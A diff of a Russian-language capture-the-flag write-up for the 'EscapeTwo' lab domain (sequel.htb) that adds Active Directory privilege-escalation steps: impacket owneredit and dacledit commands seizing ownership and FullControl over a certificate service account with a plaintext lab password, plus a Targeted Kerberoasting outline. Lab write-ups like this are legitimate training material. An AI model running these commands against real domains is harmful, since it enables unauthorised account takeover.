@@ -433,29 +433,39 @@ Info: Establishing connection to remote endpoint
 
 ---
 
-Теперь, давайте собирать информацию о учётной записи, чтоб найти какие-то лазейки, как получить доступ к правам администратора
+**На данном этапе, у нас есть два способа как получить права администратора:**
+
+Проведение атаки **shadow credentials**
 ```
-*Evil-WinRM* PS C:\Users\ryan> whoami /priv
+*Evil-WinRM* PS C:\Users\ryan\Documents> Get-ADObject -Filter {objectClass -eq "certificationAuthority"} -SearchBase "CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb"
 
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                Description                    State
-============================= ============================== =======
-SeMachineAccountPrivilege     Add workstations to domain     Enabled
-SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+DistinguishedName                                                                                                   Name               ObjectClass            ObjectGUID
+-----------------                                                                                                   ----               -----------            ----------
+CN=sequel-DC01-CA,CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb sequel-DC01-CA     certificationAuthority 94fe122e-5619-48b2-b0f6-194fbd276cac
+CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb                          NTAuthCertificates certificationAuthority 3968134c-0918-4117-acfe-cb97bebaff43
+CN=sequel-DC01-CA,CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb                       sequel-DC01-CA     certificationAuthority 81cc117d-fd4e-4a56-82c0-92d9e0753b60
 ```
 
-Вот что я нарыл в интернете:
+```
+Hexada@hexada ~/app/pentesting-tools/impacket/examples$ python3 owneredit.py -action write -new-owner ryan -target ca_svc 'escape.two.htb/ryan:WqSZAF6CysDQbGb3'                2 ↵ master 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
-`SeMachineAccountPrivilege` - Это привилегия, позволяющая добавлять рабочие станции в домен. В контексте взлома, это может быть полезно, если мы хотим добавить машину в домен
+[*] Current owner information below
+[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
+[*] - sAMAccountName: Domain Admins
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
+[*] OwnerSid modified successfully!
+```
 
-`SeChangeNotifyPrivilege` - Эта привилегия позволяет обойти проверку обхода директории (**traverse checking**). Она позволяет перемещаться по каталогу, даже если у вас нет доступа к некоторым его частям. Это может быть полезно для обхода ограничений на доступ к некоторым файлам или каталогам
+```
+Hexada@hexada ~/app/pentesting-tools/impacket/examples$ python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'escape.two.htb'/'ryan':'WqSZAF6CysDQbGb3'    
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
-`SeIncreaseWorkingSetPrivilege`: Привилегия для увеличения рабочего набора процесса. Рабочий набор — это набор страниц памяти, которые процесс может использовать. Это не так критично для пентестинга, но может быть полезно для повышения производительности некоторых процессов
+[*] DACL backed up to dacledit-20250216-170339.bak
+[*] DACL modified successfully!
+```
 
-к сожалению, с использованием этих привилегий напрямую не получится получить доступ к правам администратора или выполнить эскалацию привилегий до уровня администратора
+Или получение **NTLM** хэша через **Targeted Kerberoasting** атаку
 
 ```
 *Evil-WinRM* PS C:\Users\ryan> Get-ADUser -Identity ryan -Properties *
@@ -570,18 +580,4 @@ whenCreated                          : 6/8/2024 9:55:45 AM
 
 Команда `Get-ADUser -Identity ryan -Properties *` используется в **PowerShell** для получения информации о пользователе из **Active Directory**
 
-**Нас интересует следуйщее:**
 
-**ServicePrincipalNames (SPN)** - Это атрибут, который хранит имена сервисов, связанные с учетной записью. Он необходим для проведения **Targeted Kerberoasting** атаки. Если этот атрибут пустой (в нашем случае так и есть), это означает, что данная учетная запись не имеет связанных с ней **SPN**, и для атаки необходимо будет искать другие учетные записи с заполненным полем **SPN**.
-
-**SPN** — это уникальный идентификатор, который используется для привязки службы (например, **SQL Server** или других сервисов) к определенному пользователю в **Active Directory**. **SPN** необходим для того, чтобы **Kerberos** мог правильно аутентифицировать пользователя, обращающегося к сервису.
-
-Когда атакующий выполняет **Targeted Kerberoasting**, он пытается получить **TGS (Ticket Granting Service)** для **SPN**. Этот тикет **TGS** зашифрован с использованием пароля учетной записи, которая привязана к **SPN**. Таким образом, расшифровав TGS, атакующий может извлечь **NTLM-хэш** пароля учетной записи, связанной с этим **SPN**. После этого можно попытаться использовать этот хэш для дальнейших атак.
-
-**Targeted Kerberoasting** атака требует следуйщие условия - отсутствие данных в атрибуте **ServicePrincipalNames (SPN)**, наличие прав **WriteOwner**, также включает следуйщие шаги:
-
-С привилегией **WriteOwner** нам нужно привязать или создать **Service Principal Name (SPN)** для учетной записи администратора
-
-Используя созданный или прикрепленный **SPN**, нам нужно запросить **Ticket Granting Service (TGS)** для этой учетной записи
-
-Как только у нас будет **TGS**, мы попытаемся расшифровать его, так как он зашифрован **NTLM-хэшем** пароля, и **SPN** индефикатором, и с его помощью захватить учетную запись администратора
